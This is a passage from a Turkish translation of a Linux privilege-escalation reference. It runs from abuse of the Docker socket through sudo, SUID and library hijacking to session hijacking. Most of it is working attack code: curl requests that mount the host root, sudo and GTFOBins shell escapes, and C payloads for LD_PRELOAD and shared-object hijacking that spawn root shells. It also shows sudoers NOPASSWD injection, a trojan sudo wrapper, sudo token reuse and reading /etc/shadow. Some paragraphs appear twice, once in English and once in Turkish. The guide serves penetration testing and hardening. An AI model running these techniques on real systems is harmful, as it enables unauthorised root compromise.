#### **Docker API'sini Doğrudan Kullanma**

Docker CLI mevcut değilse bile, Docker socket Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir images listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Komut çalıştırmayı etkinleştirmek için container'a bağlantı kurmak amacıyla `socat` kullanın.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host dosya sistemine root seviyesinde erişimle container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

docker socket üzerinde yazma izinleriniz varsa çünkü **group `docker`** içinde iseniz, [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) mevcut olduğunu unutmayın. Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

docker'dan çıkış yapmak veya onu kötüye kullanarak escalate privileges için daha fazla yol için bakın:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan sofistike bir **inter-Process Communication (IPC) system**'dir. Modern Linux sistemi göz önünde bulundurularak tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem, süreçler arası veri alışverişini geliştiren temel IPC'yi destekleyerek, gelişmiş UNIX domain socket'lerini andıran bir işlevsellik sağlar. Ayrıca olay veya sinyal yayınlamayı destekleyerek sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen arama bildirimi, bir müzik oynatıcıyı sessize alması için tetikleyebilir. Bunların yanı sıra D-Bus, uygulamalar arasında servis isteklerini ve metod çağrılarını basitleştiren bir remote object system destekler; bu, geleneksel olarak karmaşık olan işlemleri kolaylaştırır.

D-Bus, mesaj izinlerini (method calls, signal emissions vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny model** üzerinde çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin istismarı yoluyla privilege escalation mümkün olabilir.

Bir örnek politika `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; root kullanıcısının `fi.w1.wpa_supplicant1` için sahiplik, gönderme ve alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanırken, "default" context politikaları diğer spesifik politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini enumerate edip exploit etmeyi buradan öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Erişim sağlamadan önce etkileşim kuramadığınız hedef makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğini kontrol et. Bunu yapabiliyorsan bazı credentials elde edebilirsin.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kontrol edin: **who** olduğunuzu, hangi **privileges**'e sahip olduğunuzu, sistemde hangi **users** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root privileges** olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** kullanarak: **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalığı sağlayabilecek herhangi bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkünse panoda ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir parolasını **biliyorsanız** parolayı kullanarak **her kullanıcı için oturum açmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü yapmaktan çekinmiyorsanız ve bilgisayarda `su` ve `timeout` ikili dosyaları varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile aynı zamanda kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH kötüye kullanımları

### $PATH

Eğer **$PATH'in bazı klasörlerinden birine yazabiliyorsanız** farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak bir komutun adıyla **yazılabilir klasöre bir backdoor oluşturarak** ayrıcalıkları yükseltebilirsiniz ve bu komutun $PATH'te yazılabilir klasörünüzden **önce yer alan bir klasörden yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları sudo kullanarak çalıştırmaya izinli olabilirsiniz veya dosyalarda suid biti setlenmiş olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmeyen komutlar dosyaları okumaya ve/veya yazmaya ya da hatta bir komut çalıştırmaya izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla şifreyi bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo`, `vim`'i `root` olarak çalıştırabiliyor; root dizinine bir ssh key ekleyerek veya `sh`'yi çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **set an environment variable** ayarlamasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer**'e dayalıydı ve script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek için **PYTHONPATH hijacking**'e **savunmasızdı:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV'nin sudo env_keep ile korunması → root shell

Eğer sudoers `BASH_ENV`'i korursa (ör. `Defaults env_keep+="ENV BASH_ENV"`), Bash'in etkileşimsiz başlangıç davranışını kullanarak izin verilen bir komutu çalıştırırken root olarak istediğiniz kodu çalıştırabilirsiniz.

- Neden işe yarar: Etkileşimsiz shell'lerde Bash `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script veya shell wrapper çalıştırılmasına izin verir. Eğer sudo `BASH_ENV`'i koruyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash`'i çağıran herhangi bir hedef veya herhangi bir bash scripti).
- `BASH_ENV`'in `env_keep` içinde olması (kontrol için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Güçlendirme:
- `BASH_ENV` (ve `ENV`) değerlerini `env_keep` içinden kaldırın, `env_reset`'i tercih edin.
- shell wrappers'ı sudo-allowed commands için kullanmaktan kaçının; minimal binaries kullanın.
- Korunan env vars kullanıldığında sudo I/O logging ve alerting'i düşünün.

### Sudo yürütme atlatma yolları

**Jump** ile diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmeden

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **başka bir komutu çalıştırıyor ve yolunu belirtmiyorsa (her zaman _**strings**_ ile garip bir SUID binary'nin içeriğini kontrol edin)**.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutun adıyla bir **export a function** oluşturmaya çalışabilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid ikili dosyasını çağırdığınızda, bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyici tarafından diğer tüm kütüphanelerden önce yüklenecek bir veya daha fazla shared library (.so dosyası) belirtmek için kullanılır; bunun içine standart C kütüphanesi (`libc.so`) da dahildir. Bu işleme kütüphane ön yükleme denir.

Ancak, sistem güvenliğini korumak ve bu özelliğin özellikle **suid/sgid** yürütülebilir dosyalarla kötüye kullanılmasını önlemek için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmeyen yürütülebilir dosyalar için **LD_PRELOAD**'ü göz ardı eder.
- suid/sgid olan yürütülebilir dosyalar için yalnızca standart yollarında bulunan ve aynı zamanda suid/sgid olan kütüphaneler ön yüklenir.

Privilege escalation, eğer `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa meydana gelebilir. Bu yapılandırma, `sudo` ile komutlar çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin kalıcı olmasına ve tanınmasına izin verir; bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu olarak kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **derleyin** şu komutla:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa suistimal edilebilir; çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Beklenmedik görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını doğru şekilde yüklüyor olup olmadığını doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, exploitation potansiyeli olduğunu gösterir.

Bunu exploit etmek için, aşağıdaki kodu içeren _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklara sahip bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını shared object (.so) dosyasına derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'sini çalıştırmak exploit'i tetikleyecek ve potansiyel sistem ele geçirilmesine olanak sağlayacaktır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabildiğimiz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle library'i o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) bir saldırganın yerel güvenlik kısıtlamalarını aşmak için suistimal edebileceği Unix ikili dosyalarının küratörlüğünü yapılmış bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise komuta **sadece argüman enjekte edebildiğiniz** durumlar için aynısıdır.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya korumak, dosya transferi yapmak, bind ve reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için suistimal edilebilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralını nasıl suistimal edebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolası olmadan **sudo erişiminiz** varsa, bir sudo komutu çalıştırılmasını bekleyip oturum token'ını kaçırarak ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten _sampleuser_ kullanıcısı olarak bir shell'e sahipsiniz
- _sampleuser_ son 15 dakika içinde **`sudo` kullanmış olmalı** (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer tüm bu gereksinimler karşılanıyorsa, **ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- İlk **exploit** (`exploit.sh`) _/tmp_ içine `activate_sudo_token` binary'sini oluşturacak. Bunu oturumunuzdaki sudo token'ını **etkinleştirmek** için kullanabilirsiniz (otomatik olarak bir root shell almayacaksınız, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root sahibi ve setuid ile bir sh shell** oluşturacaktır.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **third exploit** (`exploit_v3.sh`) **sudoers dosyası oluşturacak** ve **sudo tokens'i kalıcı hale getirip tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

If you have **write permissions** in the folder or on any of the created files inside the folder you can use the binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) to **create a sudo token for a user and PID**.\
Klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) programını kullanarak **bir kullanıcı ve PID için sudo token'ı oluşturabilirsiniz**.\
For example, if you can overwrite the file _/var/run/sudo/ts/sampleuser_ and you have a shell as that user with PID 1234, you can **obtain sudo privileges** without needing to know the password doing:
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'iniz varsa, şifreyi bilmenize gerek kalmadan **sudo ayrıcalıkları elde edebilirsiniz** şöyle yaparak:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgileri **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` ikili dosyası için bazı alternatifler vardır; OpenBSD'de `doas` gibi. Yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcı genellikle bir makineye bağlanıp ayrıcalıkları yükseltmek için `sudo` kullanıyorsa** ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak kodunuzu ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo yürütülebilir dosyası** oluşturabilirsiniz. Sonra, kullanıcı bağlamındaki **$PATH**'i (örneğin yeni yolu .bash_profile'a ekleyerek) değiştirin; böylece kullanıcı sudo çalıştırdığında sizin sudo yürütülebilir dosyanız çalıştırılır.

Unutmayın ki kullanıcı farklı bir shell (bash olmayan) kullanıyorsa yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz

Ya da şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının nereden geldiğini belirtir**. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **başka klasörlere işaret eder**; **kütüphaneler** bu klasörlerde **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin `/usr/local/lib` içindeki kütüphaneleri arayacağı anlamına gelir**.

Eğer herhangi bir nedenle **bir kullanıcının yazma izinleri** gösterilen yollardan herhangi biri üzerinde varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, o kullanıcı escalate privileges gerçekleştirebilir.\
Aşağıdaki sayfada bu yanlış yapılandırmanın **nasıl istismar edileceğine** göz atın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği üzere program bu konumdaki lib'i kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Sonra `/var/tmp` dizinine şu komutla kötü amaçlı bir kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri bir işleme mevcut root ayrıcalıklarının **bir alt kümesini** sağlar. Bu, root ayrıcalıklarını daha küçük ve ayırt edici **parçalara** böler. Bu birimlerin her biri daha sonra bağımsız olarak işlemlere verilebilir. Böylece ayrıcalıkların tam kümesi azaltılır ve istismar riskleri düşer.\
Aşağıdaki sayfayı okuyarak **Linux yetkileri ve bunların nasıl kötüye kullanılacağı** hakkında daha fazla bilgi edinin:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının "**cd**" ile klasöre girebileceği anlamına gelir.\
**"read"** biti kullanıcının **dosyaları listeleyebilmesini**, ve **"write"** biti kullanıcının **dosyaları silebilmesini** ve **yeni dosyalar oluşturabilmesini** sağlar.

## ACL'ler

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılma** yeteneğine sahiptir. Bu izinler, sahibi olmayan veya grup üyesi olmayan belirli kullanıcılara hak tanıma veya reddetme yoluyla dosya veya dizin erişimi üzerinde kontrolü artırır. Bu düzeydeki **ayrıntılı kontrol daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakın.

**Verin** kullanıcı "kali"ye bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemdeki belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** sadece **kendi kullanıcınızın** screen oturumlarına **bağlanabileceksiniz**. Ancak **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Ayrıcalığı olmayan bir kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Bir session'a bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'e bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

